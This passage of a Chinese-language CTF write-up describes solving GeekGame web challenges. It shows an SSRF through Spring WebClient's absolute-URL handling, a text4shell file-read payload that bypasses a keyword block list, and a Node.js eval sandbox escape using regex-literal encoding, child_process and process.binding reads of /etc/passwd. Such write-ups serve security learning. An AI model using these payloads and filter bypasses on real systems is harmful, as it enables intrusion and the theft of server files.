            <span class="n">index</span> <span class="o">=</span> <span class="nc">URLDecoder</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">index</span><span class="o">,</span> <span class="s">"UTF-8"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">queryBean</span><span class="o">.</span><span class="na">getType</span><span class="o">()</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">queryBean</span><span class="o">.</span><span class="na">setType</span><span class="o">(</span><span class="s">"PKU"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">if</span> <span class="o">(!</span><span class="n">typeList</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">queryBean</span><span class="o">.</span><span class="na">getType</span><span class="o">()))</span> <span class="o">{</span>
            <span class="n">typeList</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">queryBean</span><span class="o">.</span><span class="na">getType</span><span class="o">());</span>
        <span class="o">}</span>

        <span class="nc">Mono</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">str</span> <span class="o">=</span> <span class="n">webClient</span><span class="o">.</span><span class="na">post</span><span class="o">()</span>
            <span class="o">.</span><span class="na">uri</span><span class="o">(</span><span class="n">index</span><span class="o">)</span>
            <span class="o">.</span><span class="na">header</span><span class="o">(</span><span class="nc">HttpHeaders</span><span class="o">.</span><span class="na">AUTHORIZATION</span><span class="o">,</span> <span class="n">auth</span><span class="o">)</span>
            <span class="o">.</span><span class="na">body</span><span class="o">(</span><span class="nc">BodyInserters</span><span class="o">.</span><span class="na">fromFormData</span><span class="o">(</span><span class="s">"type"</span><span class="o">,</span> <span class="n">queryBean</span><span class="o">.</span><span class="na">getType</span><span class="o">()))</span>
            <span class="o">.</span><span class="na">retrieve</span><span class="o">().</span><span class="na">bodyToMono</span><span class="o">(</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>

        <span class="k">return</span> <span class="n">queryBean</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="n">str</span><span class="o">.</span><span class="na">block</span><span class="o">());</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>一开始不知道要干嘛（猜测是 SSRF，但是看 <code class="language-plaintext highlighter-rouge">webClient</code> 会处理 <code class="language-plaintext highlighter-rouge">baseUrl</code>，以为它没有问题），最后思路歪到了是不是要利用 <code class="language-plaintext highlighter-rouge">queryBean</code> 执行 SPEL。后面放出了一些补充说明，才知道 flag2 一定是 SSRF。</p>

<p>那么 <code class="language-plaintext highlighter-rouge">webClient</code> 肯定有鬼。<a href="https://github.com/spring-projects/spring-framework/blob/2a2c679f668e72d95dae12f189faab78b741037f/spring-webflux/src/main/java/org/springframework/web/reactive/function/client/WebClient.java#L170">看了一下源代码</a>：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">interface</span> <span class="nc">Builder</span> <span class="o">{</span>

   <span class="cm">/**
      * Configure a base URL for requests. Effectively a shortcut for:
      * &lt;p&gt;
      * &lt;pre class="code"&gt;
      * String baseUrl = "https://abc.go.com/v1";
      * DefaultUriBuilderFactory factory = new DefaultUriBuilderFactory(baseUrl);
      * WebClient client = WebClient.builder().uriBuilderFactory(factory).build();
      * &lt;/pre&gt;
      * &lt;p&gt;The {@code DefaultUriBuilderFactory} is used to prepare the URL
      * for every request with the given base URL, unless the URL request
      * for a given URL is absolute in which case the base URL is ignored.
      * &lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; this method is mutually exclusive with
      * {@link #uriBuilderFactory(UriBuilderFactory)}. If both are used, the
      * baseUrl value provided here will be ignored.
      * @see DefaultUriBuilderFactory#DefaultUriBuilderFactory(String)
      * @see #uriBuilderFactory(UriBuilderFactory)
      */</span>
   <span class="nc">Builder</span> <span class="nf">baseUrl</span><span class="o">(</span><span class="nc">String</span> <span class="n">baseUrl</span><span class="o">);</span>

   <span class="c1">// ...</span>
<span class="o">}</span>
</code></pre></div></div>

<p>什么？”unless the URL request for a given URL is absolute”？怎么能这么设计 API？</p>

<p>于是可以来试试 <code class="language-plaintext highlighter-rouge">https://prob08-&lt;id&gt;.geekgame.pku.edu.cn/admin/localhost%3A8080/</code>，发现有两个可用的路由：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"value"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">placeholder=</span><span class="s">"Value"</span> <span class="na">required</span> <span class="na">autofocus</span> <span class="na">name=</span><span class="s">"value"</span> <span class="na">value=</span><span class="s">"Endpoints:
/bonus
/source_bak
"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>接下来就得往 <code class="language-plaintext highlighter-rouge">index</code> 里面塞斜杠了，不幸的事情是，Spring 不吃这一套：<code class="language-plaintext highlighter-rouge">%2F</code> (<code class="language-plaintext highlighter-rouge">/</code>) 和 <code class="language-plaintext highlighter-rouge">%5C</code> (<code class="language-plaintext highlighter-rouge">\</code>) 会让它返回 400。想了一下，试了试把 <code class="language-plaintext highlighter-rouge">%2F</code> 再转义一次到 <code class="language-plaintext highlighter-rouge">%252F</code>……然后就好了。访问 bonus，获得 flag2。</p>

<h3 id="打通整个系统">打通整个系统</h3>

<p>访问 bonus 的 source_bak 可以拿到源代码：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">org.apache.commons.text.StringSubstitutor</span><span class="o">;</span>

<span class="nd">@RestController</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">BonusController</span> <span class="o">{</span>

        <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/bonus"</span><span class="o">)</span>
        <span class="kd">public</span> <span class="nc">QueryBean</span> <span class="nf">bonus</span><span class="o">(</span><span class="nc">QueryBean</span> <span class="n">queryBean</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span><span class="o">(</span><span class="n">queryBean</span><span class="o">.</span><span class="na">getType</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"CommonsText"</span><span class="o">))</span> <span class="o">{</span>
                <span class="nc">StringSubstitutor</span> <span class="n">interpolator</span> <span class="o">=</span> <span class="nc">StringSubstitutor</span><span class="o">.</span><span class="na">createInterpolator</span><span class="o">();</span>
                <span class="n">interpolator</span><span class="o">.</span><span class="na">setEnableSubstitutionInVariables</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>

                <span class="nc">String</span> <span class="n">value</span> <span class="o">=</span> <span class="n">replaceUnSafeWord</span><span class="o">(</span><span class="n">queryBean</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
                <span class="nc">String</span> <span class="n">resultValue</span> <span class="o">=</span> <span class="n">interpolator</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
                <span class="n">queryBean</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="n">resultValue</span><span class="o">);</span>

            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="c1">// flag3藏在/root/flag3.txt等待你发现            </span>
            <span class="o">}</span>

            <span class="k">return</span> <span class="n">queryBean</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">replaceUnSafeWord</span><span class="o">(</span><span class="nc">String</span> <span class="n">txt</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">String</span> <span class="n">resultTxt</span> <span class="o">=</span> <span class="n">txt</span><span class="o">;</span>

            <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">unsafeList</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;(</span><span class="nc">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="s">"java"</span><span class="o">,</span> <span class="s">"js"</span><span class="o">,</span> <span class="s">"script"</span><span class="o">,</span> <span class="s">"exec"</span><span class="o">,</span> <span class="s">"start"</span><span class="o">,</span> <span class="s">"url"</span><span class="o">,</span> <span class="s">"dns"</span><span class="o">,</span> <span class="s">"groovy"</span><span class="o">,</span> <span class="s">"bsh"</span><span class="o">,</span> <span class="s">"eval"</span><span class="o">,</span> <span class="s">"ognl"</span><span class="o">));</span>
            <span class="nc">Iterator</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">unsafeList</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>
            <span class="nc">String</span> <span class="n">word</span><span class="o">;</span>
            <span class="nc">String</span> <span class="n">replaceString</span><span class="o">;</span>
            <span class="k">while</span> <span class="o">(</span><span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">word</span> <span class="o">=</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
                <span class="n">replaceString</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
                <span class="n">resultTxt</span> <span class="o">=</span> <span class="n">resultTxt</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"(?i)"</span> <span class="o">+</span> <span class="n">word</span><span class="o">,</span> <span class="n">replaceString</span><span class="o">);</span>
            <span class="o">}</span>

            <span class="k">return</span> <span class="n">resultTxt</span><span class="o">;</span>
        <span class="o">}</span>

<span class="o">}</span>
</code></pre></div></div>

<p>怎么替换个字符串还要这么企业级。简单搜了一下，果不其然，这就是 text4shell 嘛！我们当然可以 RCE 然后绕过下面的过滤（我的猜测是让 replaceAll 来拼出 payload），但是我们只是要文件内容，何必如此麻烦？</p>

<p>Payload 为 <code class="language-plaintext highlighter-rouge">${file:UTF-8:/root/flag3.txt}</code>，于是过滤形同虚设。（对应 curl 命令为 <code class="language-plaintext highlighter-rouge">--data-raw 'type=CommonsText&amp;value=%E2%80%8B%24%7Bfile%3AUTF%2D8%3A%2Froot%2Fflag3%2Etxt%7D'</code>）</p>

<h2 id="这也能卷">这也能卷</h2>

<h3 id="flag-1前端的-flag">Flag 1：前端的 flag</h3>

<p>这个网站表面上需要开通大会员才能使用 nodejs/browser 环境执行命令。于是让我们先看看怎么开通大会员的，进入 Premium 页面，然后 F12，然后——我浏览器卡住了。</p>

<p>重新看了一下 premium.js，里面似乎有 <code class="language-plaintext highlighter-rouge">debugger</code> 指令，而且有一些魔法操作。我真的尝试去逆向了一部分的内容。尽管有 debugger 指令，借助 Chromium 的开发者工具，还是恢复了一小部分的内容，然后做着做着发现，诶，有个叫 <code class="language-plaintext highlighter-rouge">flag0</code> 的变量？</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">flag0</span><span class="o">=</span><span class="nx">_0x340c07</span><span class="p">(</span><span class="mh">0x65d</span><span class="p">,</span><span class="dl">'</span><span class="s1">aIlf</span><span class="dl">'</span><span class="p">,</span><span class="mh">0x554</span><span class="p">,</span><span class="mh">0x7bc</span><span class="p">,</span><span class="mh">0x7c0</span><span class="p">)</span><span class="o">+</span><span class="nx">_0x340c07</span><span class="p">(</span><span class="mh">0x522</span><span class="p">,</span><span class="dl">'</span><span class="s1">mxb3</span><span class="dl">'</span><span class="p">,</span><span class="mh">0x41a</span><span class="p">,</span><span class="mh">0x61d</span><span class="p">,</span><span class="mh">0x5ed</span><span class="p">)</span><span class="o">+</span><span class="nx">_0x476726</span><span class="p">(</span><span class="dl">'</span><span class="s1">Zml(</span><span class="dl">'</span><span class="p">,</span><span class="mh">0x605</span><span class="p">,</span><span class="mh">0x57c</span><span class="p">,</span><span class="mh">0x6a1</span><span class="p">,</span><span class="mh">0x5a5</span><span class="p">)</span><span class="o">+</span><span class="nx">_0x476726</span><span class="p">(</span><span class="dl">'</span><span class="s1">UwsG</span><span class="dl">'</span><span class="p">,</span><span class="mh">0x5d6</span><span class="p">,</span><span class="mh">0x5c1</span><span class="p">,</span><span class="mh">0x500</span><span class="p">,</span><span class="mh">0x601</span><span class="p">)</span><span class="o">+</span><span class="nx">_0x5e5705</span><span class="p">(</span><span class="dl">'</span><span class="s1">mmNu</span><span class="dl">'</span><span class="p">,</span><span class="mh">0x1d0</span><span class="p">,</span><span class="mh">0x354</span><span class="p">,</span><span class="mh">0x339</span><span class="p">,</span><span class="mh">0x1d1</span><span class="p">)</span><span class="o">+</span><span class="nx">_0x476726</span><span class="p">(</span><span class="dl">'</span><span class="s1">][gJ</span><span class="dl">'</span><span class="p">,</span><span class="mh">0x3b3</span><span class="p">,</span><span class="mh">0x4c7</span><span class="p">,</span><span class="mh">0x43a</span><span class="p">,</span><span class="mh">0x401</span><span class="p">)</span>
</code></pre></div></div>

<p>于是先开开发者工具，然后直接打开 premium.html，然后在 console 里面输入这一坨东西即可：</p>

<p><img src="/pictures/geekgame-2022/premium.png" alt="Get Premium Activation Code"></p>

<h3 id="flag-3nodejs-里面的-flag">Flag 3：Node.js 里面的 flag</h3>

<p>我是先做出这个（flag3）再做出 flag2 的。</p>

<p>读给的代码可以发现我们需要绕过正则表达式 <code class="language-plaintext highlighter-rouge">^([a-z0-9+\-*\/%(), ]|([0-9]+[.])+[0-9]+)+$</code>。（我特地去看了 fastify 有没有 CVE，遗憾的是，没有）</p>

<p>我被卡住了很长很长时间。这里要求不能有大写字母、中括号大括号、各种引号，<code class="language-plaintext highlighter-rouge">.</code> 前后都必须是数字，看起来只能搞出 <code class="language-plaintext highlighter-rouge">func1(1),func2(2),func3(3)</code> 这种 payload，而且也不知道 flag 在哪里。也看了看 <code class="language-plaintext highlighter-rouge">process</code>，除了知道 flag 不在环境变量里面以外没啥用。</p>

<p>之后去做别的题了。回来看的时候，想想，要不把 nodejs 所有函数过一遍？Nodejs REPL 的 Tab 补全还是很好用的。然后我发现了一个有趣的函数：<code class="language-plaintext highlighter-rouge">unescape()</code>，可以把数字变成字符串。</p>

<pre><code class="language-nodejs">&gt; unescape(2022)
'2022'
</code></pre>

<p>所以我当时想，能不能这么搞：</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">eval</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="nx">unescape</span><span class="p">(</span><span class="mi">1234567890</span><span class="p">)))</span>
</code></pre></div></div>

<p>但是查了一下 base64 的字母表，打消了这个念头，因为数字的六位编码开头都是 1，这样会导致输出第一位肯定是一个不在 ascii 表里的字符，我不认为这样能成功运行。</p>

<p>之后又没有进展。在赛博空间随机游走的时候找到了 MDN 的 JavaScript References，过了一遍，读到 Misc/Lexical grammar 这一节的时候，<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Lexical_grammar#regular_expression_literals">看到了一直想要的那个东西</a>：Regular expression literals，格式为 <code class="language-plaintext highlighter-rouge">/ab+c/</code>。</p>

<p>试一下！</p>

<pre><code class="language-nodejs">&gt; unescape(/can i construct arbitary string now/)
'/can i construct arbitary string now/'
</code></pre>

<p>好耶！虽然开头和结尾的斜杠有点烦，但是因为我们的目标是把这坨东西扔给 <code class="language-plaintext highlighter-rouge">eval()</code> 来执行，所以并非没有办法绕过，注意到我们可以写 <code class="language-plaintext highlighter-rouge">/* this is a comment */</code> 类型的注释，所以可以这样子：</p>

<pre><code class="language-nodejs">&gt; unescape(/%2A%2A%2F console%2Elog %2F%2A/)+unescape(/%2A/)
'/**/ console.log /*//*/'
&gt; eval(unescape(/%2A%2A%2F console%2Elog %2F%2A/)+unescape(/%2A/))
[Function: log]
</code></pre>

<p>顺便写个程序帮我们构造 payload：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">urllib.parse</span>
<span class="kn">import</span> <span class="nn">string</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">encode_all</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">"%{0:0&gt;2}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">),</span> <span class="s">"x"</span><span class="p">))</span> <span class="k">if</span> <span class="n">char</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="s">"1234567890"</span> <span class="k">else</span> <span class="n">char</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">encode_all</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"eval(unescape(/%2a%2a%2f </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s"> %2f%2a/)+unescape(/%2a/))"</span><span class="p">)</span>
</code></pre></div></div>

<p>好，现在我们可以执行任意 JS 了，接下来就让我们读一下文件吧！</p>

<pre><code class="language-nodejs">&gt; // 本地环境
&gt; eval(unescape(/%2a%2a%2f require%28%22child%5fprocess%22%29%2eexec%53ync%28%22ls%22%29 %2f%2a/)+unescape(/%2a/))
&lt;Buffer 61 73 73 65 74 73 0a 52 45 41 44 4d 45 2e 6d 64 0a&gt;
</code></pre>

<p>啊先不管这个 Buffer 是啥，反正看起来是行的……吧？然后扔到远程看看：</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"statusCode"</span><span class="p">:</span><span class="mi">500</span><span class="p">,</span><span class="nl">"code"</span><span class="p">:</span><span class="s2">"1"</span><span class="p">,</span><span class="nl">"error"</span><span class="p">:</span><span class="s2">"Internal Server Error"</span><span class="p">,</span><span class="nl">"message"</span><span class="p">:</span><span class="s2">"Command failed: /usr/local/bin/node --experimental-policy=policy.json --policy-integrity=sha256-1NvUvTeQqHoo+XJv7zUAobD/VEaIGQ8CB3471GP2isY= runner.js -e=ZXZhbCh1bmVzY2FwZSgvJTJhJTJhJTJmIHJlcXVpcmUlMjglMjJjaGlsZCU1ZnByb2Nlc3MlMjIlMjklMmVleGVjJTUzeW5jJTI4JTIybHMlMjIlMjkgJTJmJTJhLykrdW5lc2NhcGUoLyUyYS8pKQ==</span><span class="se">\n</span><span class="s2">(node:196) ExperimentalWarning: Policies are experimental.</span><span class="se">\n</span><span class="s2">(Use `node --trace-warnings ...` to show where the warning was created)</span><span class="se">\n</span><span class="s2">undefined:1</span><span class="se">\n</span><span class="s2">/**/ require(</span><span class="se">\"</span><span class="s2">child_process</span><span class="se">\"</span><span class="s2">).execSync(</span><span class="se">\"</span><span class="s2">ls</span><span class="se">\"</span><span class="s2">) /*//*/</span><span class="se">\n</span><span class="s2">     ^</span><span class="se">\n\n</span><span class="s2">ReferenceError: require is not defined in ES module scope, you can use import instead</span><span class="se">\n</span><span class="s2">This file is being treated as an ES module because it has a '.js' file extension and '/app/backend/package.json' contains </span><span class="se">\"</span><span class="s2">type</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">module</span><span class="se">\"</span><span class="s2">. To treat it as a CommonJS script, rename it to use the '.cjs' file extension.</span><span class="se">\n</span><span class="s2">    at eval (eval at &lt;anonymous&gt; (eval at &lt;anonymous&gt; (file:///app/backend/runner.js:9:17)), &lt;anonymous&gt;:1:6)</span><span class="se">\n</span><span class="s2">    at eval (eval at &lt;anonymous&gt; (file:///app/backend/runner.js:9:17), &lt;anonymous&gt;:1:1)</span><span class="se">\n</span><span class="s2">    at file:///app/backend/runner.js:9:17</span><span class="se">\n</span><span class="s2">    at ModuleJob.run (node:internal/modules/esm/module_job:193:25)</span><span class="se">\n</span><span class="s2">    at async Promise.all (index 0)</span><span class="se">\n</span><span class="s2">    at async ESMLoader.import (node:internal/modules/esm/loader:518:24)</span><span class="se">\n</span><span class="s2">    at async loadESM (node:internal/process/esm_loader:102:5)</span><span class="se">\n</span><span class="s2">    at async handleMainPromise (node:internal/modules/run_main:66:12)</span><span class="se">\n\n</span><span class="s2">Node.js v19.0.1</span><span class="se">\n</span><span class="s2">"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>emmmmmm <code class="language-plaintext highlighter-rouge">ReferenceError: require is not defined in ES module scope, you can use import instead</code>，不能用 <code class="language-plaintext highlighter-rouge">require</code> 啊。<code class="language-plaintext highlighter-rouge">import</code> 也试了一下，不行。网络上有些文章说可以用 <code class="language-plaintext highlighter-rouge">process.mainModule</code> 来搞，但是在最新版 Node 里面看起来也不行了。不过还好我们还有 <code class="language-plaintext highlighter-rouge">process</code>，搜了一下，可以用 <code class="language-plaintext highlighter-rouge">process.binding()</code> 来调用裸的模块函数。</p>

<p>读目录？（payload 来自 <a href="https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html">https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html</a>）</p>

<pre><code class="language-nodejs">&gt; // 本地环境
&gt; process.binding('fs').readdir("/", {}, "", "", function (err, data) {data})
[
  'bin',  'boot',  'dev',
  'efi',  'etc',   'home',
  'lib',  'lib64', 'mnt',
  'nix',  'opt',   'proc',
  'root', 'run',   'sbin',
  'srv',  'sys',   'tmp',
  'usr',  'var'
]
</code></pre>

<p>远程也可以：</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"result"</span><span class="p">:[</span><span class="s2">".dockerenv"</span><span class="p">,</span><span class="s2">"app"</span><span class="p">,</span><span class="s2">"bin"</span><span class="p">,</span><span class="s2">"boot"</span><span class="p">,</span><span class="s2">"dev"</span><span class="p">,</span><span class="s2">"etc"</span><span class="p">,</span><span class="s2">"flag"</span><span class="p">,</span><span class="s2">"home"</span><span class="p">,</span><span class="s2">"lib"</span><span class="p">,</span><span class="s2">"lib64"</span><span class="p">,</span><span class="s2">"media"</span><span class="p">,</span><span class="s2">"mnt"</span><span class="p">,</span><span class="s2">"opt"</span><span class="p">,</span><span class="s2">"proc"</span><span class="p">,</span><span class="s2">"root"</span><span class="p">,</span><span class="s2">"run"</span><span class="p">,</span><span class="s2">"sbin"</span><span class="p">,</span><span class="s2">"sock"</span><span class="p">,</span><span class="s2">"srv"</span><span class="p">,</span><span class="s2">"sys"</span><span class="p">,</span><span class="s2">"tmp"</span><span class="p">,</span><span class="s2">"usr"</span><span class="p">,</span><span class="s2">"var"</span><span class="p">]}</span><span class="w">
</span></code></pre></div></div>

<p>那 flag 一定在 <code class="language-plaintext highlighter-rouge">/flag</code> 了。参考 <a href="https://jwlss.pw/mathjs/">https://jwlss.pw/mathjs/</a> 写一下读文件的 payload……</p>

<pre><code class="language-nodejs">&gt; buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600), buffer, 0, 4096); buffer
node[1745066]: ../src/node_file.cc:1864:void node::fs::Open(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp;): Assertion `(argc) == (5)' failed.
 1: 0x7fcfa044d02d node::Abort() [/usr/bin/../lib/libnode.so.111]
 2: 0x7fcfa044d376 node::Assert(node::AssertionInfo const&amp;) [/usr/bin/../lib/libnode.so.111]
 3: 0x7fcfa046638d  [/usr/bin/../lib/libnode.so.111]
 4: 0x7fcfa082ff37  [/usr/bin/../lib/libnode.so.111]
 5: 0x7fcfa0830b66 v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) [/usr/bin/../lib/libnode.so.111]
 6: 0x7fcfa06d03f9  [/usr/bin/../lib/libnode.so.111]
fish: Job 1, 'node' terminated by signal SIGABRT (Abort)
</code></pre>

<p>emmmmmmmm 草。我本地也是最新的 Node.js 所以和远程应该现象是一样的。不过我们可以看到，它明确指出了 <code class="language-plaintext highlighter-rouge">fs::Open()</code> 需要 5 个参数，所以再来试试。我也不知道缺那两个参数是啥，先填个 0 吧：</p>

<pre><code class="language-nodejs">&gt; buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600, 0, 0), buffer, 0, 4096); buffer
node[1745716]: ../src/node_file.cc:2170:void node::fs::Read(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp;): Assertion `(argc) &gt;= (5)' failed.
 1: 0x7f31a704d02d node::Abort() [/usr/bin/../lib/libnode.so.111]
 2: 0x7f31a704d376 node::Assert(node::AssertionInfo const&amp;) [/usr/bin/../lib/libnode.so.111]
 3: 0x7f31a7065596  [/usr/bin/../lib/libnode.so.111]
 4: 0x7f31a742ff37  [/usr/bin/../lib/libnode.so.111]
 5: 0x7f31a7430b66 v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) [/usr/bin/../lib/libnode.so.111]
 6: 0x7f31a72d03f9  [/usr/bin/../lib/libnode.so.111]
fish: Job 1, 'node' terminated by signal SIGABRT (Abort)
</code></pre>

<p><code class="language-plaintext highlighter-rouge">fs::Read()</code> 也要五个参数：</p>

<pre><code class="language-nodejs">&gt; buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600, 0, 0), buffer, 0, 4096, 0); buffer
node[1745894]: ../src/node_file.cc:2204:void node::fs::Read(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp;): Assertion `(argc) == (7)' failed.
 1: 0x7fc38dc4d02d node::Abort() [/usr/bin/../lib/libnode.so.111]
 2: 0x7fc38dc4d376 node::Assert(node::AssertionInfo const&amp;) [/usr/bin/../lib/libnode.so.111]
 3: 0x7fc38dc65cad  [/usr/bin/../lib/libnode.so.111]
 4: 0x7fc38e02ff37  [/usr/bin/../lib/libnode.so.111]
 5: 0x7fc38e030b66 v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) [/usr/bin/../lib/libnode.so.111]
 6: 0x7fc38ded03f9  [/usr/bin/../lib/libnode.so.111]
fish: Job 1, 'node' terminated by signal SIGABRT (Abort)
</code></pre>

<p>哦，改成要七个参数了：</p>

<pre><code class="language-nodejs">&gt; buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600, 0, 0), buffer, 0, 4096, 0, 0, 0); buffer
&lt;Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 62 69 6e 3a 78 3a 31 3a 31 3a 3a 2f 3a 2f 75 73 72 2f 62 69 6e 2f ... 8142 more bytes&gt;
</code></pre>

<p>看起来好了。扔远程看看：</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"statusCode"</span><span class="p">:</span><span class="mi">500</span><span class="p">,</span><span class="nl">"code"</span><span class="p">:</span><span class="s2">"1"</span><span class="p">,</span><span class="nl">"error"</span><span class="p">:</span><span class="s2">"Internal Server Error"</span><span class="p">,</span><span class="nl">"message"</span><span class="p">:</span><span class="s2">"Command failed: /usr/local/bin/node --experimental-policy=policy.json --policy-integrity=sha256-1NvUvTeQqHoo+XJv7zUAobD/VEaIGQ8CB3471GP2isY= runner.js -e=ZXZhbCh1bmVzY2FwZSgvJTJhJTJhJTJmIGJ1ZmZlciUyMCUzZCUyMCU0MnVmZmVyJTJlYWxsb2MlNTVuc2FmZSUyODgxOTIlMjklM2IlMjBwcm9jZXNzJTJlYmluZGluZyUyOCUyN2ZzJTI3JTI5JTJlcmVhZCUyOHByb2Nlc3MlMmViaW5kaW5nJTI4JTI3ZnMlMjclMjklMmVvcGVuJTI4JTI3JTJmZXRjJTJmcGFzc3dkJTI3JTJjJTIwMCUyYyUyMDA2MDAlMmMlMjAwJTJjJTIwMCUyOSUyYyUyMGJ1ZmZlciUyYyUyMDAlMmMlMjA0MDk2JTJjJTIwMCUyYyUyMDAlMmMlMjAwJTI5JTNiJTIwYnVmZmVyICUyZiUyYS8pK3VuZXNjYXBlKC8lMmEvKSk=</span><span class="se">\n</span><span class="s2">(node:220) ExperimentalWarning: Policies are experimental.</span><span class="se">\n</span><span class="s2">(Use `node --trace-warnings ...` to show where the warning was created)</span><span class="se">\n</span><span class="s2">undefined:1</span><span class="se">\n</span><span class="s2">/**/ buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600, 0, 0), buffer, 0, 4096, 0, 0, 0); buffer /*//*/</span><span class="se">\n</span><span class="s2">                                                                                                                ^^^^</span><span class="se">\n\n</span><span class="s2">SyntaxError: Octal literals are not allowed in strict mode.</span><span class="se">\n</span><span class="s2">    at eval (eval at &lt;anonymous&gt; (file:///app/backend/runner.js:9:17), &lt;anonymous&gt;:1:292)</span><span class="se">\n</span><span class="s2">    at file:///app/backend/runner.js:9:17</span><span class="se">\n</span><span class="s2">    at ModuleJob.run (node:internal/modules/esm/module_job:193:25)</span><span class="se">\n</span><span class="s2">    at async Promise.all (index 0)</span><span class="se">\n</span><span class="s2">    at async ESMLoader.import (node:internal/modules/esm/loader:518:24)</span><span class="se">\n</span><span class="s2">    at async loadESM (node:internal/process/esm_loader:102:5)</span><span class="se">\n</span><span class="s2">    at async handleMainPromise (node:internal/modules/run_main:66:12)</span><span class="se">\n\n</span><span class="s2">Node.js v19.0.1</span><span class="se">\n</span><span class="s2">"</span><span class="p">}</span><span class="w">
